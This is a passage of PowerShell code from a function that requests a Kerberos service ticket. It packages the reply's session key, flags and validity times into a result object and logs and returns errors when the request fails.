                SessionKeyBytes = $serviceSessionKey
                SessionKeyType = if ($encRepPart.SessionKeyType) { $encRepPart.SessionKeyType } else { $tgsRep.EType }
                TicketFlags = $encRepPart.TicketFlags
                AuthTime = $encRepPart.AuthTime
                StartTime = $encRepPart.StartTime
                EndTime = $encRepPart.EndTime
                RenewTill = $encRepPart.RenewTill
                Message = "Service ticket acquired successfully"
            }
        }
        catch {
            Write-Log "[Request-ServiceTicket] TGS-REQ failed: $_"
            Write-Debug "[Request-ServiceTicket] Error details: $($_.Exception.ToString())"

            return [PSCustomObject]@{
                Success = $false
                ServicePrincipalName = $ServicePrincipalName
                Domain = $Domain
                DomainController = $DomainController
                Error = $_.Exception.Message
                Message = "TGS-REQ failed: $_"
            }
        }
    }

    end {
        Write-Log "[Request-ServiceTicket] TGS request completed"
    }
}
